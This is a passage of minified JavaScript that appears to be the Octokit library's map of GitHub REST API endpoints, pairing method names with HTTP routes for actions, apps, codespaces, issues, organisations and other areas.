/orgs/{org}/actions/variables"],listRepoOrganizationSecrets:["GET /repos/{owner}/{repo}/actions/organization-secrets"],listRepoOrganizationVariables:["GET /repos/{owner}/{repo}/actions/organization-variables"],listRepoSecrets:["GET /repos/{owner}/{repo}/actions/secrets"],listRepoVariables:["GET /repos/{owner}/{repo}/actions/variables"],listRepoWorkflows:["GET /repos/{owner}/{repo}/actions/workflows"],listRunnerApplicationsForOrg:["GET /orgs/{org}/actions/runners/downloads"],listRunnerApplicationsForRepo:["GET /repos/{owner}/{repo}/actions/runners/downloads"],listSelectedReposForOrgSecret:["GET /orgs/{org}/actions/secrets/{secret_name}/repositories"],listSelectedReposForOrgVariable:["GET /orgs/{org}/actions/variables/{name}/repositories"],listSelectedRepositoriesEnabledGithubActionsOrganization:["GET /orgs/{org}/actions/permissions/repositories"],listSelfHostedRunnersForOrg:["GET /orgs/{org}/actions/runners"],listSelfHostedRunnersForRepo:["GET /repos/{owner}/{repo}/actions/runners"],listWorkflowRunArtifacts:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/artifacts"],listWorkflowRuns:["GET /repos/{owner}/{repo}/actions/workflows/{workflow_id}/runs"],listWorkflowRunsForRepo:["GET /repos/{owner}/{repo}/actions/runs"],reRunJobForWorkflowRun:["POST /repos/{owner}/{repo}/actions/jobs/{job_id}/rerun"],reRunWorkflow:["POST /repos/{owner}/{repo}/actions/runs/{run_id}/rerun"],reRunWorkflowFailedJobs:["POST /repos/{owner}/{repo}/actions/runs/{run_id}/rerun-failed-jobs"],removeAllCustomLabelsFromSelfHostedRunnerForOrg:["DELETE /orgs/{org}/actions/runners/{runner_id}/labels"],removeAllCustomLabelsFromSelfHostedRunnerForRepo:["DELETE /repos/{owner}/{repo}/actions/runners/{runner_id}/labels"],removeCustomLabelFromSelfHostedRunnerForOrg:["DELETE /orgs/{org}/actions/runners/{runner_id}/labels/{name}"],removeCustomLabelFromSelfHostedRunnerForRepo:["DELETE /repos/{owner}/{repo}/actions/runners/{runner_id}/labels/{name}"],removeSelectedRepoFromOrgSecret:["DELETE /orgs/{org}/actions/secrets/{secret_name}/repositories/{repository_id}"],removeSelectedRepoFromOrgVariable:["DELETE /orgs/{org}/actions/variables/{name}/repositories/{repository_id}"],reviewCustomGatesForRun:["POST /repos/{owner}/{repo}/actions/runs/{run_id}/deployment_protection_rule"],reviewPendingDeploymentsForRun:["POST /repos/{owner}/{repo}/actions/runs/{run_id}/pending_deployments"],setAllowedActionsOrganization:["PUT /orgs/{org}/actions/permissions/selected-actions"],setAllowedActionsRepository:["PUT /repos/{owner}/{repo}/actions/permissions/selected-actions"],setCustomLabelsForSelfHostedRunnerForOrg:["PUT /orgs/{org}/actions/runners/{runner_id}/labels"],setCustomLabelsForSelfHostedRunnerForRepo:["PUT /repos/{owner}/{repo}/actions/runners/{runner_id}/labels"],setCustomOidcSubClaimForRepo:["PUT /repos/{owner}/{repo}/actions/oidc/customization/sub"],setGithubActionsDefaultWorkflowPermissionsOrganization:["PUT /orgs/{org}/actions/permissions/workflow"],setGithubActionsDefaultWorkflowPermissionsRepository:["PUT /repos/{owner}/{repo}/actions/permissions/workflow"],setGithubActionsPermissionsOrganization:["PUT /orgs/{org}/actions/permissions"],setGithubActionsPermissionsRepository:["PUT /repos/{owner}/{repo}/actions/permissions"],setSelectedReposForOrgSecret:["PUT /orgs/{org}/actions/secrets/{secret_name}/repositories"],setSelectedReposForOrgVariable:["PUT /orgs/{org}/actions/variables/{name}/repositories"],setSelectedRepositoriesEnabledGithubActionsOrganization:["PUT /orgs/{org}/actions/permissions/repositories"],setWorkflowAccessToRepository:["PUT /repos/{owner}/{repo}/actions/permissions/access"],updateEnvironmentVariable:["PATCH /repos/{owner}/{repo}/environments/{environment_name}/variables/{name}"],updateHostedRunnerForOrg:["PATCH /orgs/{org}/actions/hosted-runners/{hosted_runner_id}"],updateOrgVariable:["PATCH /orgs/{org}/actions/variables/{name}"],updateRepoVariable:["PATCH /repos/{owner}/{repo}/actions/variables/{name}"]},activity:{checkRepoIsStarredByAuthenticatedUser:["GET /user/starred/{owner}/{repo}"],deleteRepoSubscription:["DELETE /repos/{owner}/{repo}/subscription"],deleteThreadSubscription:["DELETE /notifications/threads/{thread_id}/subscription"],getFeeds:["GET /feeds"],getRepoSubscription:["GET /repos/{owner}/{repo}/subscription"],getThread:["GET /notifications/threads/{thread_id}"],getThreadSubscriptionForAuthenticatedUser:["GET /notifications/threads/{thread_id}/subscription"],listEventsForAuthenticatedUser:["GET /users/{username}/events"],listNotificationsForAuthenticatedUser:["GET /notifications"],listOrgEventsForAuthenticatedUser:["GET /users/{username}/events/orgs/{org}"],listPublicEvents:["GET /events"],listPublicEventsForRepoNetwork:["GET /networks/{owner}/{repo}/events"],listPublicEventsForUser:["GET /users/{username}/events/public"],listPublicOrgEvents:["GET /orgs/{org}/events"],listReceivedEventsForUser:["GET /users/{username}/received_events"],listReceivedPublicEventsForUser:["GET /users/{username}/received_events/public"],listRepoEvents:["GET /repos/{owner}/{repo}/events"],listRepoNotificationsForAuthenticatedUser:["GET /repos/{owner}/{repo}/notifications"],listReposStarredByAuthenticatedUser:["GET /user/starred"],listReposStarredByUser:["GET /users/{username}/starred"],listReposWatchedByUser:["GET /users/{username}/subscriptions"],listStargazersForRepo:["GET /repos/{owner}/{repo}/stargazers"],listWatchedReposForAuthenticatedUser:["GET /user/subscriptions"],listWatchersForRepo:["GET /repos/{owner}/{repo}/subscribers"],markNotificationsAsRead:["PUT /notifications"],markRepoNotificationsAsRead:["PUT /repos/{owner}/{repo}/notifications"],markThreadAsDone:["DELETE /notifications/threads/{thread_id}"],markThreadAsRead:["PATCH /notifications/threads/{thread_id}"],setRepoSubscription:["PUT /repos/{owner}/{repo}/subscription"],setThreadSubscription:["PUT /notifications/threads/{thread_id}/subscription"],starRepoForAuthenticatedUser:["PUT /user/starred/{owner}/{repo}"],unstarRepoForAuthenticatedUser:["DELETE /user/starred/{owner}/{repo}"]},apps:{addRepoToInstallation:["PUT /user/installations/{installation_id}/repositories/{repository_id}",{},{renamed:["apps","addRepoToInstallationForAuthenticatedUser"]}],addRepoToInstallationForAuthenticatedUser:["PUT /user/installations/{installation_id}/repositories/{repository_id}"],checkToken:["POST /applications/{client_id}/token"],createFromManifest:["POST /app-manifests/{code}/conversions"],createInstallationAccessToken:["POST /app/installations/{installation_id}/access_tokens"],deleteAuthorization:["DELETE /applications/{client_id}/grant"],deleteInstallation:["DELETE /app/installations/{installation_id}"],deleteToken:["DELETE /applications/{client_id}/token"],getAuthenticated:["GET /app"],getBySlug:["GET /apps/{app_slug}"],getInstallation:["GET /app/installations/{installation_id}"],getOrgInstallation:["GET /orgs/{org}/installation"],getRepoInstallation:["GET /repos/{owner}/{repo}/installation"],getSubscriptionPlanForAccount:["GET /marketplace_listing/accounts/{account_id}"],getSubscriptionPlanForAccountStubbed:["GET /marketplace_listing/stubbed/accounts/{account_id}"],getUserInstallation:["GET /users/{username}/installation"],getWebhookConfigForApp:["GET /app/hook/config"],getWebhookDelivery:["GET /app/hook/deliveries/{delivery_id}"],listAccountsForPlan:["GET /marketplace_listing/plans/{plan_id}/accounts"],listAccountsForPlanStubbed:["GET /marketplace_listing/stubbed/plans/{plan_id}/accounts"],listInstallationReposForAuthenticatedUser:["GET /user/installations/{installation_id}/repositories"],listInstallationRequestsForAuthenticatedApp:["GET /app/installation-requests"],listInstallations:["GET /app/installations"],listInstallationsForAuthenticatedUser:["GET /user/installations"],listPlans:["GET /marketplace_listing/plans"],listPlansStubbed:["GET /marketplace_listing/stubbed/plans"],listReposAccessibleToInstallation:["GET /installation/repositories"],listSubscriptionsForAuthenticatedUser:["GET /user/marketplace_purchases"],listSubscriptionsForAuthenticatedUserStubbed:["GET /user/marketplace_purchases/stubbed"],listWebhookDeliveries:["GET /app/hook/deliveries"],redeliverWebhookDelivery:["POST /app/hook/deliveries/{delivery_id}/attempts"],removeRepoFromInstallation:["DELETE /user/installations/{installation_id}/repositories/{repository_id}",{},{renamed:["apps","removeRepoFromInstallationForAuthenticatedUser"]}],removeRepoFromInstallationForAuthenticatedUser:["DELETE /user/installations/{installation_id}/repositories/{repository_id}"],resetToken:["PATCH /applications/{client_id}/token"],revokeInstallationAccessToken:["DELETE /installation/token"],scopeToken:["POST /applications/{client_id}/token/scoped"],suspendInstallation:["PUT /app/installations/{installation_id}/suspended"],unsuspendInstallation:["DELETE /app/installations/{installation_id}/suspended"],updateWebhookConfigForApp:["PATCH /app/hook/config"]},billing:{getGithubActionsBillingOrg:["GET /orgs/{org}/settings/billing/actions"],getGithubActionsBillingUser:["GET /users/{username}/settings/billing/actions"],getGithubBillingUsageReportOrg:["GET /organizations/{org}/settings/billing/usage"],getGithubPackagesBillingOrg:["GET /orgs/{org}/settings/billing/packages"],getGithubPackagesBillingUser:["GET /users/{username}/settings/billing/packages"],getSharedStorageBillingOrg:["GET /orgs/{org}/settings/billing/shared-storage"],getSharedStorageBillingUser:["GET /users/{username}/settings/billing/shared-storage"]},checks:{create:["POST /repos/{owner}/{repo}/check-runs"],createSuite:["POST /repos/{owner}/{repo}/check-suites"],get:["GET /repos/{owner}/{repo}/check-runs/{check_run_id}"],getSuite:["GET /repos/{owner}/{repo}/check-suites/{check_suite_id}"],listAnnotations:["GET /repos/{owner}/{repo}/check-runs/{check_run_id}/annotations"],listForRef:["GET /repos/{owner}/{repo}/commits/{ref}/check-runs"],listForSuite:["GET /repos/{owner}/{repo}/check-suites/{check_suite_id}/check-runs"],listSuitesForRef:["GET /repos/{owner}/{repo}/commits/{ref}/check-suites"],rerequestRun:["POST /repos/{owner}/{repo}/check-runs/{check_run_id}/rerequest"],rerequestSuite:["POST /repos/{owner}/{repo}/check-suites/{check_suite_id}/rerequest"],setSuitesPreferences:["PATCH /repos/{owner}/{repo}/check-suites/preferences"],update:["PATCH /repos/{owner}/{repo}/check-runs/{check_run_id}"]},codeScanning:{commitAutofix:["POST /repos/{owner}/{repo}/code-scanning/alerts/{alert_number}/autofix/commits"],createAutofix:["POST /repos/{owner}/{repo}/code-scanning/alerts/{alert_number}/autofix"],createVariantAnalysis:["POST /repos/{owner}/{repo}/code-scanning/codeql/variant-analyses"],deleteAnalysis:["DELETE /repos/{owner}/{repo}/code-scanning/analyses/{analysis_id}{?confirm_delete}"],deleteCodeqlDatabase:["DELETE /repos/{owner}/{repo}/code-scanning/codeql/databases/{language}"],getAlert:["GET /repos/{owner}/{repo}/code-scanning/alerts/{alert_number}",{},{renamedParameters:{alert_id:"alert_number"}}],getAnalysis:["GET /repos/{owner}/{repo}/code-scanning/analyses/{analysis_id}"],getAutofix:["GET /repos/{owner}/{repo}/code-scanning/alerts/{alert_number}/autofix"],getCodeqlDatabase:["GET /repos/{owner}/{repo}/code-scanning/codeql/databases/{language}"],getDefaultSetup:["GET /repos/{owner}/{repo}/code-scanning/default-setup"],getSarif:["GET /repos/{owner}/{repo}/code-scanning/sarifs/{sarif_id}"],getVariantAnalysis:["GET /repos/{owner}/{repo}/code-scanning/codeql/variant-analyses/{codeql_variant_analysis_id}"],getVariantAnalysisRepoTask:["GET /repos/{owner}/{repo}/code-scanning/codeql/variant-analyses/{codeql_variant_analysis_id}/repos/{repo_owner}/{repo_name}"],listAlertInstances:["GET /repos/{owner}/{repo}/code-scanning/alerts/{alert_number}/instances"],listAlertsForOrg:["GET /orgs/{org}/code-scanning/alerts"],listAlertsForRepo:["GET /repos/{owner}/{repo}/code-scanning/alerts"],listAlertsInstances:["GET /repos/{owner}/{repo}/code-scanning/alerts/{alert_number}/instances",{},{renamed:["codeScanning","listAlertInstances"]}],listCodeqlDatabases:["GET /repos/{owner}/{repo}/code-scanning/codeql/databases"],listRecentAnalyses:["GET /repos/{owner}/{repo}/code-scanning/analyses"],updateAlert:["PATCH /repos/{owner}/{repo}/code-scanning/alerts/{alert_number}"],updateDefaultSetup:["PATCH /repos/{owner}/{repo}/code-scanning/default-setup"],uploadSarif:["POST /repos/{owner}/{repo}/code-scanning/sarifs"]},codeSecurity:{attachConfiguration:["POST /orgs/{org}/code-security/configurations/{configuration_id}/attach"],attachEnterpriseConfiguration:["POST /enterprises/{enterprise}/code-security/configurations/{configuration_id}/attach"],createConfiguration:["POST /orgs/{org}/code-security/configurations"],createConfigurationForEnterprise:["POST /enterprises/{enterprise}/code-security/configurations"],deleteConfiguration:["DELETE /orgs/{org}/code-security/configurations/{configuration_id}"],deleteConfigurationForEnterprise:["DELETE /enterprises/{enterprise}/code-security/configurations/{configuration_id}"],detachConfiguration:["DELETE /orgs/{org}/code-security/configurations/detach"],getConfiguration:["GET /orgs/{org}/code-security/configurations/{configuration_id}"],getConfigurationForRepository:["GET /repos/{owner}/{repo}/code-security-configuration"],getConfigurationsForEnterprise:["GET /enterprises/{enterprise}/code-security/configurations"],getConfigurationsForOrg:["GET /orgs/{org}/code-security/configurations"],getDefaultConfigurations:["GET /orgs/{org}/code-security/configurations/defaults"],getDefaultConfigurationsForEnterprise:["GET /enterprises/{enterprise}/code-security/configurations/defaults"],getRepositoriesForConfiguration:["GET /orgs/{org}/code-security/configurations/{configuration_id}/repositories"],getRepositoriesForEnterpriseConfiguration:["GET /enterprises/{enterprise}/code-security/configurations/{configuration_id}/repositories"],getSingleConfigurationForEnterprise:["GET /enterprises/{enterprise}/code-security/configurations/{configuration_id}"],setConfigurationAsDefault:["PUT /orgs/{org}/code-security/configurations/{configuration_id}/defaults"],setConfigurationAsDefaultForEnterprise:["PUT /enterprises/{enterprise}/code-security/configurations/{configuration_id}/defaults"],updateConfiguration:["PATCH /orgs/{org}/code-security/configurations/{configuration_id}"],updateEnterpriseConfiguration:["PATCH /enterprises/{enterprise}/code-security/configurations/{configuration_id}"]},codesOfConduct:{getAllCodesOfConduct:["GET /codes_of_conduct"],getConductCode:["GET /codes_of_conduct/{key}"]},codespaces:{addRepositoryForSecretForAuthenticatedUser:["PUT /user/codespaces/secrets/{secret_name}/repositories/{repository_id}"],addSelectedRepoToOrgSecret:["PUT /orgs/{org}/codespaces/secrets/{secret_name}/repositories/{repository_id}"],checkPermissionsForDevcontainer:["GET /repos/{owner}/{repo}/codespaces/permissions_check"],codespaceMachinesForAuthenticatedUser:["GET /user/codespaces/{codespace_name}/machines"],createForAuthenticatedUser:["POST /user/codespaces"],createOrUpdateOrgSecret:["PUT /orgs/{org}/codespaces/secrets/{secret_name}"],createOrUpdateRepoSecret:["PUT /repos/{owner}/{repo}/codespaces/secrets/{secret_name}"],createOrUpdateSecretForAuthenticatedUser:["PUT /user/codespaces/secrets/{secret_name}"],createWithPrForAuthenticatedUser:["POST /repos/{owner}/{repo}/pulls/{pull_number}/codespaces"],createWithRepoForAuthenticatedUser:["POST /repos/{owner}/{repo}/codespaces"],deleteForAuthenticatedUser:["DELETE /user/codespaces/{codespace_name}"],deleteFromOrganization:["DELETE /orgs/{org}/members/{username}/codespaces/{codespace_name}"],deleteOrgSecret:["DELETE /orgs/{org}/codespaces/secrets/{secret_name}"],deleteRepoSecret:["DELETE /repos/{owner}/{repo}/codespaces/secrets/{secret_name}"],deleteSecretForAuthenticatedUser:["DELETE /user/codespaces/secrets/{secret_name}"],exportForAuthenticatedUser:["POST /user/codespaces/{codespace_name}/exports"],getCodespacesForUserInOrg:["GET /orgs/{org}/members/{username}/codespaces"],getExportDetailsForAuthenticatedUser:["GET /user/codespaces/{codespace_name}/exports/{export_id}"],getForAuthenticatedUser:["GET /user/codespaces/{codespace_name}"],getOrgPublicKey:["GET /orgs/{org}/codespaces/secrets/public-key"],getOrgSecret:["GET /orgs/{org}/codespaces/secrets/{secret_name}"],getPublicKeyForAuthenticatedUser:["GET /user/codespaces/secrets/public-key"],getRepoPublicKey:["GET /repos/{owner}/{repo}/codespaces/secrets/public-key"],getRepoSecret:["GET /repos/{owner}/{repo}/codespaces/secrets/{secret_name}"],getSecretForAuthenticatedUser:["GET /user/codespaces/secrets/{secret_name}"],listDevcontainersInRepositoryForAuthenticatedUser:["GET /repos/{owner}/{repo}/codespaces/devcontainers"],listForAuthenticatedUser:["GET /user/codespaces"],listInOrganization:["GET /orgs/{org}/codespaces",{},{renamedParameters:{org_id:"org"}}],listInRepositoryForAuthenticatedUser:["GET /repos/{owner}/{repo}/codespaces"],listOrgSecrets:["GET /orgs/{org}/codespaces/secrets"],listRepoSecrets:["GET /repos/{owner}/{repo}/codespaces/secrets"],listRepositoriesForSecretForAuthenticatedUser:["GET /user/codespaces/secrets/{secret_name}/repositories"],listSecretsForAuthenticatedUser:["GET /user/codespaces/secrets"],listSelectedReposForOrgSecret:["GET /orgs/{org}/codespaces/secrets/{secret_name}/repositories"],preFlightWithRepoForAuthenticatedUser:["GET /repos/{owner}/{repo}/codespaces/new"],publishForAuthenticatedUser:["POST /user/codespaces/{codespace_name}/publish"],removeRepositoryForSecretForAuthenticatedUser:["DELETE /user/codespaces/secrets/{secret_name}/repositories/{repository_id}"],removeSelectedRepoFromOrgSecret:["DELETE /orgs/{org}/codespaces/secrets/{secret_name}/repositories/{repository_id}"],repoMachinesForAuthenticatedUser:["GET /repos/{owner}/{repo}/codespaces/machines"],setRepositoriesForSecretForAuthenticatedUser:["PUT /user/codespaces/secrets/{secret_name}/repositories"],setSelectedReposForOrgSecret:["PUT /orgs/{org}/codespaces/secrets/{secret_name}/repositories"],startForAuthenticatedUser:["POST /user/codespaces/{codespace_name}/start"],stopForAuthenticatedUser:["POST /user/codespaces/{codespace_name}/stop"],stopInOrganization:["POST /orgs/{org}/members/{username}/codespaces/{codespace_name}/stop"],updateForAuthenticatedUser:["PATCH /user/codespaces/{codespace_name}"]},copilot:{addCopilotSeatsForTeams:["POST /orgs/{org}/copilot/billing/selected_teams"],addCopilotSeatsForUsers:["POST /orgs/{org}/copilot/billing/selected_users"],cancelCopilotSeatAssignmentForTeams:["DELETE /orgs/{org}/copilot/billing/selected_teams"],cancelCopilotSeatAssignmentForUsers:["DELETE /orgs/{org}/copilot/billing/selected_users"],copilotMetricsForOrganization:["GET /orgs/{org}/copilot/metrics"],copilotMetricsForTeam:["GET /orgs/{org}/team/{team_slug}/copilot/metrics"],getCopilotOrganizationDetails:["GET /orgs/{org}/copilot/billing"],getCopilotSeatDetailsForUser:["GET /orgs/{org}/members/{username}/copilot"],listCopilotSeats:["GET /orgs/{org}/copilot/billing/seats"],usageMetricsForOrg:["GET /orgs/{org}/copilot/usage"],usageMetricsForTeam:["GET /orgs/{org}/team/{team_slug}/copilot/usage"]},dependabot:{addSelectedRepoToOrgSecret:["PUT /orgs/{org}/dependabot/secrets/{secret_name}/repositories/{repository_id}"],createOrUpdateOrgSecret:["PUT /orgs/{org}/dependabot/secrets/{secret_name}"],createOrUpdateRepoSecret:["PUT /repos/{owner}/{repo}/dependabot/secrets/{secret_name}"],deleteOrgSecret:["DELETE /orgs/{org}/dependabot/secrets/{secret_name}"],deleteRepoSecret:["DELETE /repos/{owner}/{repo}/dependabot/secrets/{secret_name}"],getAlert:["GET /repos/{owner}/{repo}/dependabot/alerts/{alert_number}"],getOrgPublicKey:["GET /orgs/{org}/dependabot/secrets/public-key"],getOrgSecret:["GET /orgs/{org}/dependabot/secrets/{secret_name}"],getRepoPublicKey:["GET /repos/{owner}/{repo}/dependabot/secrets/public-key"],getRepoSecret:["GET /repos/{owner}/{repo}/dependabot/secrets/{secret_name}"],listAlertsForEnterprise:["GET /enterprises/{enterprise}/dependabot/alerts"],listAlertsForOrg:["GET /orgs/{org}/dependabot/alerts"],listAlertsForRepo:["GET /repos/{owner}/{repo}/dependabot/alerts"],listOrgSecrets:["GET /orgs/{org}/dependabot/secrets"],listRepoSecrets:["GET /repos/{owner}/{repo}/dependabot/secrets"],listSelectedReposForOrgSecret:["GET /orgs/{org}/dependabot/secrets/{secret_name}/repositories"],removeSelectedRepoFromOrgSecret:["DELETE /orgs/{org}/dependabot/secrets/{secret_name}/repositories/{repository_id}"],setSelectedReposForOrgSecret:["PUT /orgs/{org}/dependabot/secrets/{secret_name}/repositories"],updateAlert:["PATCH /repos/{owner}/{repo}/dependabot/alerts/{alert_number}"]},dependencyGraph:{createRepositorySnapshot:["POST /repos/{owner}/{repo}/dependency-graph/snapshots"],diffRange:["GET /repos/{owner}/{repo}/dependency-graph/compare/{basehead}"],exportSbom:["GET /repos/{owner}/{repo}/dependency-graph/sbom"]},emojis:{get:["GET /emojis"]},gists:{checkIsStarred:["GET /gists/{gist_id}/star"],create:["POST /gists"],createComment:["POST /gists/{gist_id}/comments"],delete:["DELETE /gists/{gist_id}"],deleteComment:["DELETE /gists/{gist_id}/comments/{comment_id}"],fork:["POST /gists/{gist_id}/forks"],get:["GET /gists/{gist_id}"],getComment:["GET /gists/{gist_id}/comments/{comment_id}"],getRevision:["GET /gists/{gist_id}/{sha}"],list:["GET /gists"],listComments:["GET /gists/{gist_id}/comments"],listCommits:["GET /gists/{gist_id}/commits"],listForUser:["GET /users/{username}/gists"],listForks:["GET /gists/{gist_id}/forks"],listPublic:["GET /gists/public"],listStarred:["GET /gists/starred"],star:["PUT /gists/{gist_id}/star"],unstar:["DELETE /gists/{gist_id}/star"],update:["PATCH /gists/{gist_id}"],updateComment:["PATCH /gists/{gist_id}/comments/{comment_id}"]},git:{createBlob:["POST /repos/{owner}/{repo}/git/blobs"],createCommit:["POST /repos/{owner}/{repo}/git/commits"],createRef:["POST /repos/{owner}/{repo}/git/refs"],createTag:["POST /repos/{owner}/{repo}/git/tags"],createTree:["POST /repos/{owner}/{repo}/git/trees"],deleteRef:["DELETE /repos/{owner}/{repo}/git/refs/{ref}"],getBlob:["GET /repos/{owner}/{repo}/git/blobs/{file_sha}"],getCommit:["GET /repos/{owner}/{repo}/git/commits/{commit_sha}"],getRef:["GET /repos/{owner}/{repo}/git/ref/{ref}"],getTag:["GET /repos/{owner}/{repo}/git/tags/{tag_sha}"],getTree:["GET /repos/{owner}/{repo}/git/trees/{tree_sha}"],listMatchingRefs:["GET /repos/{owner}/{repo}/git/matching-refs/{ref}"],updateRef:["PATCH /repos/{owner}/{repo}/git/refs/{ref}"]},gitignore:{getAllTemplates:["GET /gitignore/templates"],getTemplate:["GET /gitignore/templates/{name}"]},hostedCompute:{createNetworkConfigurationForOrg:["POST /orgs/{org}/settings/network-configurations"],deleteNetworkConfigurationFromOrg:["DELETE /orgs/{org}/settings/network-configurations/{network_configuration_id}"],getNetworkConfigurationForOrg:["GET /orgs/{org}/settings/network-configurations/{network_configuration_id}"],getNetworkSettingsForOrg:["GET /orgs/{org}/settings/network-settings/{network_settings_id}"],listNetworkConfigurationsForOrg:["GET /orgs/{org}/settings/network-configurations"],updateNetworkConfigurationForOrg:["PATCH /orgs/{org}/settings/network-configurations/{network_configuration_id}"]},interactions:{getRestrictionsForAuthenticatedUser:["GET /user/interaction-limits"],getRestrictionsForOrg:["GET /orgs/{org}/interaction-limits"],getRestrictionsForRepo:["GET /repos/{owner}/{repo}/interaction-limits"],getRestrictionsForYourPublicRepos:["GET /user/interaction-limits",{},{renamed:["interactions","getRestrictionsForAuthenticatedUser"]}],removeRestrictionsForAuthenticatedUser:["DELETE /user/interaction-limits"],removeRestrictionsForOrg:["DELETE /orgs/{org}/interaction-limits"],removeRestrictionsForRepo:["DELETE /repos/{owner}/{repo}/interaction-limits"],removeRestrictionsForYourPublicRepos:["DELETE /user/interaction-limits",{},{renamed:["interactions","removeRestrictionsForAuthenticatedUser"]}],setRestrictionsForAuthenticatedUser:["PUT /user/interaction-limits"],setRestrictionsForOrg:["PUT /orgs/{org}/interaction-limits"],setRestrictionsForRepo:["PUT /repos/{owner}/{repo}/interaction-limits"],setRestrictionsForYourPublicRepos:["PUT /user/interaction-limits",{},{renamed:["interactions","setRestrictionsForAuthenticatedUser"]}]},issues:{addAssignees:["POST /repos/{owner}/{repo}/issues/{issue_number}/assignees"],addLabels:["POST /repos/{owner}/{repo}/issues/{issue_number}/labels"],addSubIssue:["POST /repos/{owner}/{repo}/issues/{issue_number}/sub_issues"],checkUserCanBeAssigned:["GET /repos/{owner}/{repo}/assignees/{assignee}"],checkUserCanBeAssignedToIssue:["GET /repos/{owner}/{repo}/issues/{issue_number}/assignees/{assignee}"],create:["POST /repos/{owner}/{repo}/issues"],createComment:["POST /repos/{owner}/{repo}/issues/{issue_number}/comments"],createLabel:["POST /repos/{owner}/{repo}/labels"],createMilestone:["POST /repos/{owner}/{repo}/milestones"],deleteComment:["DELETE /repos/{owner}/{repo}/issues/comments/{comment_id}"],deleteLabel:["DELETE /repos/{owner}/{repo}/labels/{name}"],deleteMilestone:["DELETE /repos/{owner}/{repo}/milestones/{milestone_number}"],get:["GET /repos/{owner}/{repo}/issues/{issue_number}"],getComment:["GET /repos/{owner}/{repo}/issues/comments/{comment_id}"],getEvent:["GET /repos/{owner}/{repo}/issues/events/{event_id}"],getLabel:["GET /repos/{owner}/{repo}/labels/{name}"],getMilestone:["GET /repos/{owner}/{repo}/milestones/{milestone_number}"],list:["GET /issues"],listAssignees:["GET /repos/{owner}/{repo}/assignees"],listComments:["GET /repos/{owner}/{repo}/issues/{issue_number}/comments"],listCommentsForRepo:["GET /repos/{owner}/{repo}/issues/comments"],listEvents:["GET /repos/{owner}/{repo}/issues/{issue_number}/events"],listEventsForRepo:["GET /repos/{owner}/{repo}/issues/events"],listEventsForTimeline:["GET /repos/{owner}/{repo}/issues/{issue_number}/timeline"],listForAuthenticatedUser:["GET /user/issues"],listForOrg:["GET /orgs/{org}/issues"],listForRepo:["GET /repos/{owner}/{repo}/issues"],listLabelsForMilestone:["GET /repos/{owner}/{repo}/milestones/{milestone_number}/labels"],listLabelsForRepo:["GET /repos/{owner}/{repo}/labels"],listLabelsOnIssue:["GET /repos/{owner}/{repo}/issues/{issue_number}/labels"],listMilestones:["GET /repos/{owner}/{repo}/milestones"],listSubIssues:["GET /repos/{owner}/{repo}/issues/{issue_number}/sub_issues"],lock:["PUT /repos/{owner}/{repo}/issues/{issue_number}/lock"],removeAllLabels:["DELETE /repos/{owner}/{repo}/issues/{issue_number}/labels"],removeAssignees:["DELETE /repos/{owner}/{repo}/issues/{issue_number}/assignees"],removeLabel:["DELETE /repos/{owner}/{repo}/issues/{issue_number}/labels/{name}"],removeSubIssue:["DELETE /repos/{owner}/{repo}/issues/{issue_number}/sub_issue"],reprioritizeSubIssue:["PATCH /repos/{owner}/{repo}/issues/{issue_number}/sub_issues/priority"],setLabels:["PUT /repos/{owner}/{repo}/issues/{issue_number}/labels"],unlock:["DELETE /repos/{owner}/{repo}/issues/{issue_number}/lock"],update:["PATCH /repos/{owner}/{repo}/issues/{issue_number}"],updateComment:["PATCH /repos/{owner}/{repo}/issues/comments/{comment_id}"],updateLabel:["PATCH /repos/{owner}/{repo}/labels/{name}"],updateMilestone:["PATCH /repos/{owner}/{repo}/milestones/{milestone_number}"]},licenses:{get:["GET /licenses/{license}"],getAllCommonlyUsed:["GET /licenses"],getForRepo:["GET /repos/{owner}/{repo}/license"]},markdown:{render:["POST /markdown"],renderRaw:["POST /markdown/raw",{headers:{"content-type":"text/plain; charset=utf-8"}}]},meta:{get:["GET /meta"],getAllVersions:["GET /versions"],getOctocat:["GET /octocat"],getZen:["GET /zen"],root:["GET /"]},migrations:{deleteArchiveForAuthenticatedUser:["DELETE /user/migrations/{migration_id}/archive"],deleteArchiveForOrg:["DELETE /orgs/{org}/migrations/{migration_id}/archive"],downloadArchiveForOrg:["GET /orgs/{org}/migrations/{migration_id}/archive"],getArchiveForAuthenticatedUser:["GET /user/migrations/{migration_id}/archive"],getStatusForAuthenticatedUser:["GET /user/migrations/{migration_id}"],getStatusForOrg:["GET /orgs/{org}/migrations/{migration_id}"],listForAuthenticatedUser:["GET /user/migrations"],listForOrg:["GET /orgs/{org}/migrations"],listReposForAuthenticatedUser:["GET /user/migrations/{migration_id}/repositories"],listReposForOrg:["GET /orgs/{org}/migrations/{migration_id}/repositories"],listReposForUser:["GET /user/migrations/{migration_id}/repositories",{},{renamed:["migrations","listReposForAuthenticatedUser"]}],startForAuthenticatedUser:["POST /user/migrations"],startForOrg:["POST /orgs/{org}/migrations"],unlockRepoForAuthenticatedUser:["DELETE /user/migrations/{migration_id}/repos/{repo_name}/lock"],unlockRepoForOrg:["DELETE /orgs/{org}/migrations/{migration_id}/repos/{repo_name}/lock"]},oidc:{getOidcCustomSubTemplateForOrg:["GET /orgs/{org}/actions/oidc/customization/sub"],updateOidcCustomSubTemplateForOrg:["PUT /orgs/{org}/actions/oidc/customization/sub"]},orgs:{addSecurityManagerTeam:["PUT /orgs/{org}/security-managers/teams/{team_slug}",{},{deprecated:"octokit.rest.orgs.addSecurityManagerTeam() is deprecated, see https://docs.github.com/rest/orgs/security-managers#add-a-security-manager-team"}],assignTeamToOrgRole:["PUT /orgs/{org}/organization-roles/teams/{team_slug}/{role_id}"],assignUserToOrgRole:["PUT /orgs/{org}/organization-roles/users/{username}/{role_id}"],blockUser:["PUT /orgs/{org}/blocks/{username}"],cancelInvitation:["DELETE /orgs/{org}/invitations/{invitation_id}"],checkBlockedUser:["GET /orgs/{org}/blocks/{username}"],checkMembershipForUser:["GET /orgs/{org}/members/{username}"],checkPublicMembershipForUser:["GET /orgs/{org}/public_members/{username}"],convertMemberToOutsideCollaborator:["PUT /orgs/{org}/outside_collaborators/{username}"],createInvitation:["POST /orgs/{org}/invitations"],createIssueType:["POST /orgs/{org}/issue-types"],createOrUpdateCustomProperties:["PATCH /orgs/{org}/properties/schema"],createOrUpdateCustomPropertiesValuesForRepos:["PATCH /orgs/{org}/properties/values"],createOrUpdateCustomProperty:["PUT /orgs/{org}/properties/schema/{custom_property_name}"],createWebhook:["POST /orgs/{org}/hooks"],delete:["DELETE /orgs/{org}"],deleteIssueType:["DELETE 